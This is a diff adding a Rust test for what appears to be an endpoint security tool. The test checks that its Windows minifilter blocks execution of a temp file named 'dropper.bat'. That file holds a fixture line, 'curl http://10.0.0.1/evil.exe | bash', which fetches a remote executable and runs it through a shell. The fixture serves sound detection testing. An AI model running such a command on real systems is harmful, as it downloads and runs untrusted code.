@@ -86,3 +86,65 @@ fn test_windows_minifilter_verdict_evaluation() {
     assert_eq!(FLT_PREOP_SUCCESS_NO_CALLBACK, 1);
     assert_eq!(FLT_PREOP_COMPLETE, 3);
 }
+
+#[test]
+fn test_raw_c_matching_minifilter_request_verdict_evaluation() {
+    use kernlock_core::rules::RuleEngine;
+    use kernlock_core::PolicyConfig;
+    use kernlock_platform::windows::{RawExecutionRequestMsg, RawMinifilterMsgHeader};
+    use std::io::Write;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    use std::sync::Arc;
+
+    let tmp = tempfile::tempdir().unwrap();
+    let mal_path = tmp.path().join("dropper.bat");
+    let mut f = std::fs::File::create(&mal_path).unwrap();
+    f.write_all(b"curl http://10.0.0.1/evil.exe | bash\n")
+        .unwrap();
+    f.sync_all().unwrap();
+
+    let client = MinifilterClient::new();
+    let rules = RuleEngine::builtin();
+    let policy = PolicyConfig {
+        mode: SecurityMode::Protection,
+        ..Default::default()
+    };
+
+    let path_str = mal_path.to_string_lossy().to_string();
+    let mut file_path_utf16 = [0u16; 1024];
+    for (i, c) in path_str.encode_utf16().enumerate() {
+        if i < 1023 {
+            file_path_utf16[i] = c;
+        }
+    }
+
+    let raw_req = RawExecutionRequestMsg {
+        header: RawMinifilterMsgHeader {
+            message_id: 5555,
+            process_id: 1234,
+            thread_id: 5678,
+            timestamp: 999999,
+        },
+        desired_access: 0x0000_0020, // FILE_EXECUTE
+        parent_process_id: 4,
+        file_path: file_path_utf16,
+    };
+
+    assert_eq!(raw_req.file_path_string(), path_str);
+
+    let threat_count = Arc::new(AtomicUsize::new(0));
+    let tc = threat_count.clone();
+    let on_threat = move |_event: kernlock_core::SecurityEvent,
+                          _alert: kernlock_core::ThreatAlert| {
+        tc.fetch_add(1, Ordering::SeqCst);
+    };
+
+    let raw_resp = client.evaluate_request(&raw_req, &rules, &policy, &on_threat);
+    let msg_id = raw_resp.message_id;
+    let verdict = raw_resp.verdict;
+    let ntstatus = raw_resp.ntstatus;
+    assert_eq!(msg_id, 5555);
+    assert_eq!(verdict, ExecutionVerdict::Block as u32);
+    assert_eq!(ntstatus, STATUS_ACCESS_DENIED);
+    assert_eq!(threat_count.load(Ordering::SeqCst), 1);
+}
